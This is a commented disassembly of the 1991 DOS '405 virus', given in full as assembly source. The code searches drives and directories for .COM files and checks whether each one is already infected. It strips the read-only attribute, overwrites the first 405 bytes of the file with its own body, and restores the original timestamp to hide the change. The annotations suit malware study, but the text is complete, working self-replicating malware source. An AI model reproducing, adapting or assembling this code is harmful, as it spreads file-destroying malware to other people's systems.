;405 virus
;disassembled 10th March 1991 by Fred Deakin.
;

start:
       xchg si,ax		     ;96	  }marker bytes ?
       add [bx+si],al		     ;00 00	  }
       sahf			     ;9e	  }
       add [bx+si],al		     ;00 00	  }
       nop			     ;90	  }
       mov ax,0000h		     ;clear ax
       mov byte es:[drive],al	     ;default drive?
       mov byte es:[dir_path],al     ;clear first byte in directory path
       mov byte es:[l_drvs],al	     ;clear logical drives
       push ax			     ;save ax
       mov ah,19h		     ;get current drive
       int 21h			     ;call msdos
       mov byte es:[drive],al	     ;and save
       mov ah,47h		     ;get directory path
       add al,01h		     ;add 1 to drive code
       push ax			     ;and save
       mov dl,al		     ;move drive code to dl
       lea si,[dir_path]	     ;si=offset address of directory buffer
       int 21h			     ;call msdos
       pop ax			     ;get back drive code
       mov ah,0eh		     ;set default drive
       sub al,01h		     ;subtract and get logical drive
       mov dl,al		     ;drive wanted
       int 21h			     ;call msdos
       mov byte es:[l_drvs],al	     ;store how many logical drives
l0139:
       mov al,byte es:[drive]	     ;get default drive
       cmp al,00h		     ;drive a:?
       jnz l0152		     ;if not jump forward
       mov ah,0eh		     ;set default drive
       mov dl,02h		     ;drive c:
       int 21h			     ;call msdos
       mov ah,19h		     ;get current drive
       int 21h			     ;call msdos
       mov byte es:[c_drv],al	      ;and save
       jmp l0179		     ;jump forward
       nop			     ;no operation
l0152:
       cmp al,01h		     ;drive b:?
       jnz l0167		     ;jump forward if not
       mov ah,0eh		     ;set default drive
       mov dl,02h		     ;to drive c:
       int 21h			     ;call msdos
       mov ah,19h		     ;get current drive
       int 21h			     ;call msdos
       mov byte es:[c_drv],al	      ;and save
       jmp l0179		     ;jump forward
       nop			     ;no operation
l0167:
       cmp al,02h		     ;drive c:?
       jnz l0179		     ;if not jump forward
       mov ah,0eh		     ;set default drive
       mov dl,00h		     ;drive a:
       int 21h			     ;call msdos
       mov ah,19h		     ;get current drive
       int 21h			     ;call msdos
       mov byte es:[c_drv],al	     ;and save
l0179:
       mov ah,4eh		     ;search for first
       mov cx,0001h		     ;file attributes
       lea dx,[f_name]		     ;point to file name
       int 21h			     ;call msdos
       jb l0189 		     ;no .COM files
       jmp l01a9		     ;found one
       nop			     ;no operation
l0189:
       mov ah,3bh		     ;set directory
       lea dx,[l0297]		     ;point to path
       int 21h			     ;call msdos
       mov ah,4eh		     ;search for first
       mov cx,0011h		     ;set attributes
       lea dx,[l0292]		     ;
       int 21h			     ;call msdos
       jb l0139 		     ;no .COM files
       jmp l0179		     ;jump back
l01a0:
       mov ah,4fh		     ;search for next
       int 21h			     ;call msdos
       jb l0189 		     ;no .COM files found
       jmp l01a9		     ;found one
       nop			     ;no operation
l01a9:
       mov ah,3dh		     ;open file
       mov al,02h		     ;for read/write access
       mov dx,009eh		     ;offset address of path name
       int 21h			     ;call msdos
       mov bx,ax		     ;save file handle
       mov ah,3fh		     ;read file
       mov cx,0195h		     ;would you believe 405 bytes to read
       nop			     ;no operation
       mov dx,0e000h		     ;offset address of buffer
       nop			     ;no operation
       int 21h			     ;call msdos
       mov ah,3eh		     ;close file
       int 21h			     ;call msdos
       mov bx,es:[0e000h]	     ;get first byte of loaded buffer
       cmp bx,9600h		     ;405 virus already installed?
       jz l01a0 		     ;yes jump back and search for next
       mov ah,43h		     ;get/set file attributes
       mov al,00h		     ;get file attributes
       mov dx,009eh		     ;offset address of path name
       int 21h			     ;call msdos
       mov ah,43h		     ;get/set file attributes
       mov al,01h		     ;set file attributes
       and cx,00feh		     ;no files read only
       int 21h			     ;call msdos
       mov ah,3dh		     ;open file
       mov al,02h		     ;for read/write access
       mov dx,009eh		     ;offset address of path name
       int 21h			     ;call msdos
       mov bx,ax		     ;save file handle in bx
       mov ah,57h		     ;get/set date and time
       mov al,00h		     ;get file date and time
       int 21h			     ;call msdos
       push cx			     ;file time
       push dx			     ;file date
       mov dx,cs:[0295h]	     ;get variable byte?
       mov cs:[0e195h],dx	     ;place at end of file loaded
       mov dx,cs:[0e001h]	     ;get second byte in buffer
       lea cx,ds:[0194h]	     ;
       sub dx,cx		     ;
       mov cs:[0295h],dx	     ;place at end of file
       mov ah,40h		     ;write file
       mov cx,0195h		     ;amount of bytes to write
       nop			     ;no operation
       lea dx,[start]		     ;get starting location
       int 21h			     ;call msdos
       mov ah,57h		     ;get/set file date and time
       mov al,01h		     ;set file date and time
       pop dx			     ;file date
       pop cx			     ;file time
       int 21h			     ;call msdos
       mov ah,3eh		     ;close file
       int 21h			     ;call msdos
       mov dx,cs:[0e195h]	     ;get variable
       mov cs:[0295h],dx	     ;place at end of file
       jmp l0234		     ;jump forward
       nop			     ;no operation
l0234:
       mov ah,0eh		     ;set default drive
       mov dl,byte cs:[drive]	     ;get back original default drive
       int 21h			     ;call msdos
       mov ah,3bh		     ;set directory
       lea dx,[c_drv]		     ;8d 16 4a 02
       int 21h			     ;call msdos
       mov ah,00h		     ;return to dos
       int 21h			     ;call msdos
drive:
       db 02				 ;drive variable
c_drv:
       db 00				 ;current drive
dir_path:
       db "TEST"
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
       db 00,00,00,00,00,00,00,00,00,00
l_drvs:
	db 00				 ;how many logical drives on system
f_name:
	db "*.COM"
	db 0h
l0292:
	db 2ah,00h
l0293:
	db 0e9h,00h
l0295:
	db 00h
l0297:
